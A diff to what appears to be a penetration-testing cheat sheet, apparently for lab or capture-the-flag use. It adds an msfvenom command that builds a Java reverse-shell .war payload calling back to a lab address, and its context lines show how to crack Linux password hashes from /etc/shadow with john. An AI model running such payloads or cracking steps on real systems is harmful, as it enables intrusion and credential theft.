@@ -576,6 +576,14 @@ Windows Python to Windows EXE
 $ python pyinstaller.py --onefile <pythonscript>
 ```
 
+## MSFVenom payload generation
+
+Java / .war
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f war -o rshell.war
+```
+
+
 ## Password Cracking
 
 Online hash cracker: https://crackstation.net/
@@ -585,4 +593,3 @@ Cracking linux hashes - requires `/etc/passwd` and `/etc/shadow`
 $ unshadow passwd.txt shadow.txt > passwords.txt
 $ john --wordlist=rockyou.txt passwords.txt
 ```
-
